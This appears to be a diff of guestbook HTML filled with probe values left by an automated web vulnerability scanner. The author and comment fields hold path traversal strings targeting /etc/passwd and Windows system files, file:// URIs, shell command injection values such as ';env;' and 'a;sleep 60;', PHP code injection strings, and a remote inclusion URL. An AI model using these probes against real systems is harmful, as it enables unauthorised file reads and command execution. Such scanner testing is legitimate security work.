+	&lt;p&gt; - by ../../../../../../../../../../Windows/System32/drivers/etc/services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../../../../../../../../../../../Windows/System32/drivers/etc/services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz/../../../../../../../../../../etc/passwd &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz/../../../../../../../../../../../../../../../../../../../../etc/passwd &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz/../../../../../../../../../../etc/passwd  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz/../../../../../../../../../../../../../../../../../../../../etc/passwd  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz/../../../../../../../../../../etc/services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz/../../../../../../../../../../../../../../../../../../../../etc/services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz/../../../../../../../../../../etc/services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz/../../../../../../../../../../../../../../../../../../../../etc/services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz/../../../../../../../../../../Windows/System32/drivers/etc/services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz/../../../../../../../../../../Windows/System32/drivers/etc/services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz/../../../../../../../../../../etc/passwd &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz/../../../../../../../../../../../../../../../../../../../../etc/passwd &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz/../../../../../../../../../../etc/passwd  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz/../../../../../../../../../../../../../../../../../../../../etc/passwd  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz/../../../../../../../../../../etc/services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz/../../../../../../../../../../../../../../../../../../../../etc/services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz/../../../../../../../../../../etc/services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz/../../../../../../../../../../../../../../../../../../../../etc/services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz/../../../../../../../../../../Windows/System32/drivers/etc/services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz/../../../../../../../../../../Windows/System32/drivers/etc/services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by file:///etc/passwd &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by file://C:\Windows\System32\drivers\etc\services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by guestbook.php &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by guestbook.php  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by guestbook.php::$DATA &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by https://wapiti3.ovh//e.php &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by https://wapiti3.ovh//e.php  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by /etc/passwd &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by /etc/passwd  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by /etc/services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by /etc/services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by C:\Windows\System32\drivers\etc\services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by C:\Windows\System32\drivers\etc\services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by C:\Windows\System32\drivers\etc\services::$DATA &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by C:/Windows/System32/drivers/etc/services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by C:/Windows/System32/drivers/etc/services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by C:/Windows/System32/drivers/etc/services::$DATA &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../Windows/System32/drivers/etc/services&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../../../../../../../../../../../Windows/System32/drivers/etc/services&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../Windows/System32/drivers/etc/services &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../../../../../../../../../../../Windows/System32/drivers/etc/services &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz/../../../../../../../../../../etc/passwd&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz/../../../../../../../../../../../../../../../../../../../../etc/passwd&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz/../../../../../../../../../../etc/passwd &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz/../../../../../../../../../../../../../../../../../../../../etc/passwd &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz/../../../../../../../../../../etc/services&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz/../../../../../../../../../../../../../../../../../../../../etc/services&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz/../../../../../../../../../../etc/services &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz/../../../../../../../../../../../../../../../../../../../../etc/services &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz/../../../../../../../../../../Windows/System32/drivers/etc/services&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz/../../../../../../../../../../../../../../../../../../../../Windows/System32/drivers/etc/services&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz/../../../../../../../../../../Windows/System32/drivers/etc/services &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz/../../../../../../../../../../../../../../../../../../../../Windows/System32/drivers/etc/services &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz/../../../../../../../../../../etc/passwd&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz/../../../../../../../../../../../../../../../../../../../../etc/passwd&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz/../../../../../../../../../../etc/passwd &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz/../../../../../../../../../../../../../../../../../../../../etc/passwd &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz/../../../../../../../../../../etc/services&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz/../../../../../../../../../../../../../../../../../../../../etc/services&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz/../../../../../../../../../../etc/services &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz/../../../../../../../../../../../../../../../../../../../../etc/services &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz/../../../../../../../../../../Windows/System32/drivers/etc/services&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz/../../../../../../../../../../../../../../../../../../../../Windows/System32/drivers/etc/services&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz/../../../../../../../../../../Windows/System32/drivers/etc/services &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz/../../../../../../../../../../../../../../../../../../../../Windows/System32/drivers/etc/services &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;file:///etc/passwd&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;file://C:\Windows\System32\drivers\etc\services&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/services&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/services &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//Windows/System32/drivers/etc/services&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//Windows/System32/drivers/etc/services &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;guestbook.php&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;guestbook.php &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;guestbook.php::$DATA&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by https://wapiti3.ovh//e.php &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by https://wapiti3.ovh//e.php  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by /etc/passwd &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by /etc/passwd  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by /etc/services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by /etc/services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by C:\Windows\System32\drivers\etc\services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by C:\Windows\System32\drivers\etc\services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by C:\Windows\System32\drivers\etc\services::$DATA &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by C:/Windows/System32/drivers/etc/services &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by C:/Windows/System32/drivers/etc/services  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by C:/Windows/System32/drivers/etc/services::$DATA &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../lib/ &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../windows/ &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by a|sleep 60; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;amp;ping -n 25 127.0.0.1&amp;amp; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;;env;&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;|env|&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;a;env;&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;a;env;&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../../../../../../usr/bin/env|&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!;env;&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!
+env;&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;&amp;set&amp;&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;set&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;env&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;/e &lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;a;exit(md5(&#39;w4p1t1_md5&#39;));//&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;a;exit(md5(&#39;w4p1t1_md5&#39;));#&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;&#34;;exit(md5(&#39;w4p1t1_md5&#39;));//&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;&#34;;exit(md5(&#39;w4p1t1_md5&#39;));#&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;&#39;;exit(md5(&#39;w4p1t1_md5&#39;));//&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;&#39;;exit(md5(&#39;w4p1t1_md5&#39;));#&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;&#34;.exit(md5(&#39;w4p1t1_md5&#39;));//&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;&#34;.exit(md5(&#39;w4p1t1_md5&#39;));#&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;&#39;.exit(md5(&#39;w4p1t1_md5&#39;));//&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;&#39;.exit(md5(&#39;w4p1t1_md5&#39;));#&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;;exit(md5(&#39;w4p1t1_md5&#39;));//&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;;exit(md5(&#39;w4p1t1_md5&#39;));#&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;data:;base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;a`)`&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;a`sleep 60`&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;a;sleep 60;&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;a|sleep 60;&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;&amp;ping -n 25 127.0.0.1&amp;&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;https://wapiti3.ovh//e.php&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;https://wapiti3.ovh//e.php &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;/etc/passwd&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;/etc/passwd &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;/etc/services&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;/etc/services &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;C:\Windows\System32\drivers\etc\services&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;C:\Windows\System32\drivers\etc\services &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;C:\Windows\System32\drivers\etc\services::$DATA&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;C:/Windows/System32/drivers/etc/services&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;C:/Windows/System32/drivers/etc/services &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;C:/Windows/System32/drivers/etc/services::$DATA&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../lib/&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../windows/&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../etc/passwd&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../../../../../../../../../../../etc/passwd&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../etc/passwd &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../../../../../../../../../../../etc/passwd &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../etc/services&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../../../../../../../../../../../etc/services&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../etc/services &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../../../../../../../../../../../etc/services &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;&#39;;exit(md5(&#39;w4p1t1_md5&#39;));#&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;&#34;.exit(md5(&#39;w4p1t1_md5&#39;));//&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;&#34;.exit(md5(&#39;w4p1t1_md5&#39;));#&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;&#39;.exit(md5(&#39;w4p1t1_md5&#39;));//&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;&#39;.exit(md5(&#39;w4p1t1_md5&#39;));#&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;;exit(md5(&#39;w4p1t1_md5&#39;));//&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;;exit(md5(&#39;w4p1t1_md5&#39;));#&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;data:;base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;a`)`&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;a`sleep 60`&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;a;sleep 60;&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;a|sleep 60;&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;&amp;ping -n 25 127.0.0.1&amp;&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by ;env; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by |env| &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by a;env; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by a;env; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../../../../../../usr/bin/env| &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz;env; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz
+env; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;amp;set&amp;amp; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by set &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by env &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by /e  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by a;exit(md5(&amp;#039;w4p1t1_md5&amp;#039;));// &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by a;exit(md5(&amp;#039;w4p1t1_md5&amp;#039;));# &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;quot;;exit(md5(&amp;#039;w4p1t1_md5&amp;#039;));// &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;quot;;exit(md5(&amp;#039;w4p1t1_md5&amp;#039;));# &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;#039;;exit(md5(&amp;#039;w4p1t1_md5&amp;#039;));// &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;#039;;exit(md5(&amp;#039;w4p1t1_md5&amp;#039;));# &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;quot;.exit(md5(&amp;#039;w4p1t1_md5&amp;#039;));// &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;quot;.exit(md5(&amp;#039;w4p1t1_md5&amp;#039;));# &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;#039;.exit(md5(&amp;#039;w4p1t1_md5&amp;#039;));// &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;#039;.exit(md5(&amp;#039;w4p1t1_md5&amp;#039;));# &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by ;exit(md5(&amp;#039;w4p1t1_md5&amp;#039;));// &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
